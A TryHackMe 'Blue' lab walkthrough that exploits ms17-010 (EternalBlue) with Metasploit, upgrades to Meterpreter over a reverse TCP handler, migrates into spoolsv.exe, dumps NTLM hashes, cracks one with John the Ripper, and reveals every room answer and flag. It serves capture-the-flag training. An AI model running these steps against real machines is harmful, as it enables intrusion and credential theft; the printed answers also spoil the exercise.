# Blue — TryHackMe Walkthrough

> Deploy and hack into a Windows machine, leveraging common misconfiguration issues.

<p align="center"><img src="https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/1773339260886-blue.png" /></p>

<p align="center">
  <a href="https://tryhackme.com/room/blue"><img src="https://img.shields.io/badge/TryHackMe-Blue-red?style=for-the-badge&logo=tryhackme" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows" />
  <img src="https://img.shields.io/badge/Focus-Exploitation-orange?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Focus-Privilege%20Escalation-orange?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Focus-Hash%20Cracking-orange?style=for-the-badge" />
</p>

---

## Topics Covered

| Topic | Tool / Technique |
|---|---|
| Network Enumeration | Nmap with vuln scripts |
| Exploitation | Metasploit — ms17-010 EternalBlue |
| Shell Upgrade | shell_to_meterpreter post module |
| Privilege Escalation | Process migration in Meterpreter |
| Credential Dumping | Meterpreter hashdump |
| Hash Cracking | Password hash brute forcing |

---

## Learning Objectives

- Identify vulnerable services using Nmap vulnerability scripts
- Exploit MS17-010 (EternalBlue) using Metasploit
- Upgrade a standard shell to a Meterpreter session
- Migrate processes to stabilise and maintain SYSTEM-level access
- Dump NTLM password hashes from a compromised Windows machine
- Crack NTLM hashes offline to recover plaintext credentials
- Locate flags planted in common sensitive directories on Windows

---

## Prerequisites

- Basic familiarity with Nmap and Metasploit
- Kali Linux or any distro with Metasploit Framework installed
- This machine does not respond to ping (ICMP) — use `-Pn` if your scans fail to detect the host

---

## [Task 1] Recon

### Task 1.1 — Scan the machine

**Approach:** Run an Nmap SYN scan with service detection and the `--script vuln` flag. The vuln script category runs a collection of scripts that check for known CVEs, including the SMB vulnerability ms17-010. Since the machine does not respond to ICMP, Nmap's default ping probe may miss it — the `-sS` flag bypasses this by attempting a TCP SYN scan directly.

```
sudo nmap -sS -sC -sV -vv --script vuln Machine_IP
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 17:23 EDT
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:23
Completed NSE at 17:23, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:23
Completed NSE at 17:23, 0.00s elapsed
Initiating Ping Scan at 17:23
Scanning blue (Machine_IP) [4 ports]
Completed Ping Scan at 17:23, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:23
Scanning blue (Machine_IP) [1000 ports]
Discovered open port 139/tcp on Machine_IP
Discovered open port 135/tcp on Machine_IP
Discovered open port 3389/tcp on Machine_IP
Discovered open port 445/tcp on Machine_IP
Discovered open port 49158/tcp on Machine_IP
Discovered open port 49154/tcp on Machine_IP
Discovered open port 49152/tcp on Machine_IP
Discovered open port 49153/tcp on Machine_IP
Discovered open port 49160/tcp on Machine_IP
Completed SYN Stealth Scan at 17:23, 0.75s elapsed (1000 total ports)
Initiating Service scan at 17:23
Scanning 9 services on blue (Machine_IP)
Service scan Timing: About 55.56% done; ETC: 17:25 (0:00:43 remaining)
Completed Service scan at 17:24, 59.35s elapsed (9 services on 1 host)
NSE: Script scanning Machine_IP.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:24
NSE Timing: About 99.82% done; ETC: 17:24 (0:00:00 remaining)
Completed NSE at 17:25, 32.95s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 5.81s elapsed
Nmap scan report for blue (Machine_IP)
Host is up, received echo-reply ttl 127 (0.041s latency).
Scanned at 2020-09-14 17:23:27 EDT for 99s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_sslv2-drown:
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 17:25
Completed NSE at 17:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.64 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.064KB)
```

> **Note:** Nine ports are open in total. Of the open ports, three fall below 1000: 135 (MSRPC), 139 (NetBIOS), and 445 (SMB). The vuln scripts flag the SMB service as vulnerable to ms17-010 — a critical remote code execution flaw in Microsoft's SMBv1 implementation, the same exploit used by the WannaCry ransomware campaign. This is our primary attack path.

### Task 1.2 — How many ports are open with a port number under 1000?

<details><summary>Reveal Answer</summary>

`3`

</details>

---

### Task 1.3 — What is this machine vulnerable to?

<details><summary>Reveal Answer</summary>

`ms17-010`

</details>

---

## [Task 2] Gain Access

### Task 2.1 — Start Metasploit

**Approach:** Launch the Metasploit Framework console. This gives you access to all built-in exploit modules, payloads, and auxiliary scanners.

```
msfconsole
```

> **Note:** Metasploit may take a moment to load. Once you see the `msf5 >` prompt, you are ready to proceed.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 2.2 — Find the exploitation module. What is the full path?

**Approach:** Use the `search` command inside Metasploit to find all modules related to ms17-010. Look for the EternalBlue exploit targeting standard Windows 7 and Server 2008 R2 — it has a rank of `average` and supports arch checking.

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

> **Note:** Module 2 is the one we want — `exploit/windows/smb/ms17_010_eternalblue`. It targets the kernel pool corruption in SMBv1 and supports architecture verification before firing. The `_win8` variant is for newer Windows builds and is not needed here.

<details><summary>Reveal Answer</summary>

`exploit/windows/smb/ms17_010_eternalblue`

</details>

---

### Task 2.3 — Show options and set the required value. What is the name of this value?

**Approach:** Select the module with `use`, then run `show options` to see what parameters need to be configured. The only required field without a default is `RHOSTS` — the target IP address. Set it and confirm with `show options` again.

```
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS Machine_IP
RHOSTS => Machine_IP
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         Machine_IP       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

> **Note:** RHOSTS is the only value without a default — it tells the exploit which machine to target. RPORT defaults to 445 (SMB), which is correct. Once RHOSTS is set, the module is ready to run.

<details><summary>Reveal Answer</summary>

`RHOSTS`

</details>

---

### Task 2.4 — Run the exploit

**Approach:** Type `run` or `exploit` at the prompt. Metasploit will verify the target architecture, send the EternalBlue payload, and attempt to open a shell session on the machine.

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
```

> **Note:** The exploit takes a moment. If it succeeds, a shell session opens and you will see a session ID assigned in the output. If it fails, try running it again — the exploit has an `average` reliability rating and may need more than one attempt.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 2.5 — Background the shell

**Approach:** Once a DOS shell appears (you may need to press Enter), background it with `CTRL + Z` and confirm when prompted. This keeps the session alive while you return to the Metasploit console to upgrade it.

> **Note:** Backgrounding does not kill the session — it suspends interaction with it. You can re-enter it at any time using `sessions -i <id>`.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

## [Task 3] Escalate

### Task 3.1 — What is the name of the post module used to convert a shell to Meterpreter?

**Approach:** The raw shell obtained from EternalBlue is limited — it has no file upload, pivoting, or hash-dumping capabilities. The `shell_to_meterpreter` post module injects a Meterpreter payload into the existing session, upgrading it to a fully-featured agent.

> **Note:** You can find this module by searching `search shell_to_meterpreter` inside Metasploit. Once you know the path, select it with `use post/multi/manage/shell_to_meterpreter`.

<details><summary>Reveal Answer</summary>

`post/multi/manage/shell_to_meterpreter`

</details>

---

### Task 3.2 — Show options. What option are we required to change?

**Approach:** Run `show options` after selecting the module. Look for a required field with no current value set.

```
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

> **Note:** SESSION is the required field — it tells the module which existing shell session to upgrade. HANDLER is already set to true, which automatically starts a listener to catch the new Meterpreter connection.

<details><summary>Reveal Answer</summary>

`SESSION`

</details>

---

### Task 3.3 — Set the required option

**Approach:** Run `sessions` to list active sessions and note the ID of the shell session from Task 2. Set it using `set SESSION <id>`.

```
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

> **Note:** Session 1 is the raw shell from EternalBlue. We will upgrade it to a Meterpreter session next.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 3.4 — Run the module

**Approach:** Run the post module. It will inject a Meterpreter stage into the existing session, open a handler, and register a new session (typically ID 2) once the callback arrives.

```
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on YOUR_IP:4433
[*] Post module execution completed
[*] Sending stage (176195 bytes) to Machine_IP
[*] Meterpreter session 2 opened (YOUR_IP:4433 -> Machine_IP:49303) at 2020-09-14 17:41:50 -0400
[*] Stopping exploit/multi/handler
```

> **Note:** A new Meterpreter session (session 2) has been opened. The connection runs from your machine's port 4433 back to the target. The original shell session (session 1) is preserved alongside it.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 3.5 — Select the Meterpreter session

**Approach:** List all sessions to confirm both are active, then interact with the new Meterpreter session using `sessions -i 2`.

```
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  YOUR_IP:4444 -> Machine_IP:49253 (Machine_IP)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      YOUR_IP:4433 -> Machine_IP:49303 (Machine_IP)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```

> **Note:** Session 2 is already running as NT AUTHORITY\SYSTEM — the highest privilege level on a Windows machine. The `meterpreter >` prompt confirms you are now interacting with a full Meterpreter agent.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 3.6 — Verify SYSTEM access via whoami

**Approach:** Drop into a DOS shell using the `shell` command and run `whoami` to confirm the privilege level. Background the DOS shell afterwards and return to the Meterpreter prompt.

```
meterpreter > shell
Process 1580 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

> **Note:** The output confirms we are running as `nt authority\system` — Windows' equivalent of root. Background this shell with `CTRL + Z` when done and return to your Meterpreter session.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 3.7 — List running processes with ps

**Approach:** Back in Meterpreter, run `ps` to list all running processes. Look for a stable process near the bottom of the list that runs as NT AUTHORITY\SYSTEM. Note its PID — you will migrate into it next.

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1056  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1104  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1136  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1272  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1320  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1408  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1464  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1572  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1580  1684  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
 1604  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1684  2920  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 1904  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2432  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2476  1272  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2532  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2576  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2596  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2624  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2768  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2920  2344  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

> **Note:** The process list shows many services running as NT AUTHORITY\SYSTEM. A good stable target for migration is `spoolsv.exe` (PID 1272) — it is a long-running print spooler service unlikely to crash or restart. Avoid migrating into short-lived or interactive processes.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 3.8 — Migrate to the target process

**Approach:** Use `migrate <PID>` to move your Meterpreter agent into the chosen process. This makes the agent more stable and ensures it persists within a trusted Windows service. PID 1272 (`spoolsv.exe`) is used here.

```
meterpreter > migrate 1272
[*] Migrating from 1684 to 1272...
[*] Migration completed successfully.
```

> **Note:** Your Meterpreter agent has moved from the PowerShell process (PID 1684) into `spoolsv.exe` (PID 1272). The agent now lives in a stable, persistent system process. Migration is not always reliable — if it fails, try a different SYSTEM process or restart the exploit.

<details><summary>Reveal Answer</summary>

`migrate 1272`

</details>

---

## [Task 4] Cracking

### Task 4.1 — Run hashdump. What is the name of the non-default user?

**Approach:** With SYSTEM privileges and a stable process, run `hashdump` in Meterpreter to extract NTLM password hashes from the SAM database. The SAM (Security Account Manager) stores Windows credentials — access to it requires SYSTEM-level privileges.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

> **Note:** The output is in the format `username:RID:LM_hash:NTLM_hash`. Administrator (RID 500) and Guest (RID 501) are default Windows accounts. Jon (RID 1000) is the non-default user — RIDs starting at 1000 indicate accounts created after Windows installation. The NTLM hash for Jon is `ffb43f0de35be4d9917ac0cc8ad57f8d`.

<details><summary>Reveal Answer</summary>

`jon`

</details>

---

### Task 4.2 — Crack the hash. What is the cracked password?

**Approach:** Copy Jon's NTLM hash to a file and crack it offline. Tools like John the Ripper or Hashcat can brute-force NTLM hashes against a wordlist. Using `rockyou.txt` as the wordlist is a common starting point for Windows CTF boxes.

```bash
# Save the hash to a file
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon_hash.txt

# Crack with John the Ripper
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt
```

> **Note:** John the Ripper identifies the hash format as NT (NTLM) and runs it against rockyou.txt. The password is recovered quickly because it appears in common wordlists. Always use a good wordlist before attempting full brute force — it saves significant time.

<details><summary>Reveal Answer</summary>

`alqfna22`

</details>

---

## [Task 5] Find Flags

### Task 5.1 — Flag 1

**Approach:** Drop into a shell from Meterpreter and check the root of the C: drive. Flag 1 is placed at `C:\flag1.txt` — a location a SYSTEM-level attacker would have immediate access to.

```
meterpreter > shell
Process 1888 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>
```

```
C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{access_the_machine}
```

> **Note:** Flag 1 is in the root of the C: drive. This location represents basic access — any user with a shell on the machine could read a file here. It confirms you have successfully gained entry to the system.

<details><summary>Reveal Answer</summary>

`access_the_machine`

</details>

---

### Task 5.2 — Flag 2

**Approach:** Search the entire filesystem for any file matching `*flag*.txt` using the `dir /s` command. This recursively searches all directories. Flag 2 is located inside `C:\Windows\system32\config` — the directory that holds the SAM database and other sensitive registry hives.

```
C:\Windows\system32>dir *flag*.txt /s
dir *flag*.txt /s
 Volume in drive C has no label.
 Volume Serial Number is E611-0B66

 Directory of C:\Windows\system32\config

03/17/2019  02:32 PM                34 flag2.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               0 Dir(s)  20,438,118,400 bytes free

C:\Windows\system32>type config\flag2.txt
type config\flag2.txt
flag{sam_database_elevated_access}
```

> **Note:** The `config` directory stores the SAM database (where password hashes live), SYSTEM hive, and SECURITY hive. Ordinary users cannot read files here — only SYSTEM can. The flag name references this directly, reinforcing why privilege escalation was necessary before this step.

<details><summary>Reveal Answer</summary>

`sam_database_elevated_access`

</details>

---

### Task 5.3 — Flag 3

**Approach:** Flag 3 is in the Documents folder of the non-default user Jon. On Windows 7, user folders live under `C:\Users\` or `C:\Documents and Settings\` depending on the OS version. Since this is Windows 7, the legacy path applies here.

```
C:\Windows\system32>type C:\"Documents and Settings"\Jon\Documents\flag3.txt
type C:\"Documents and Settings"\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```

> **Note:** User document folders can contain sensitive files left behind by administrators or users. This flag highlights the importance of checking personal directories after gaining SYSTEM access — credentials, notes, and configuration files are commonly found there.

<details><summary>Reveal Answer</summary>

`admin_documents_can_be_valuable`

</details>

---

## Summary

| Step | Task | Tool / Command | Outcome |
|---|---|---|---|
| 1 | Reconnaissance | `nmap -sS -sC -sV --script vuln` | Identified ms17-010 on port 445 |
| 2 | Find exploit module | `search ms17-010` in Metasploit | Located `exploit/windows/smb/ms17_010_eternalblue` |
| 3 | Configure exploit | `set RHOSTS Machine_IP` | Set target to machine IP |
| 4 | Gain initial shell | `run` | Opened shell session (Session 1) as SYSTEM |
| 5 | Upgrade shell | `post/multi/manage/shell_to_meterpreter` | Upgraded to Meterpreter (Session 2) |
| 6 | Confirm privileges | `shell` + `whoami` | Confirmed `nt authority\system` |
| 7 | Stabilise agent | `migrate 1272` (spoolsv.exe) | Moved agent into stable SYSTEM process |
| 8 | Dump hashes | `hashdump` | Recovered NTLM hash for user Jon |
| 9 | Crack hash | John the Ripper + rockyou.txt | Cracked Jon's password: `alqfna22` |
| 10 | Flag 1 | `type C:\flag1.txt` | `flag{access_the_machine}` |
| 11 | Flag 2 | `dir *flag*.txt /s` + `type` | `flag{sam_database_elevated_access}` |
| 12 | Flag 3 | `type C:\"Documents and Settings"\Jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` |
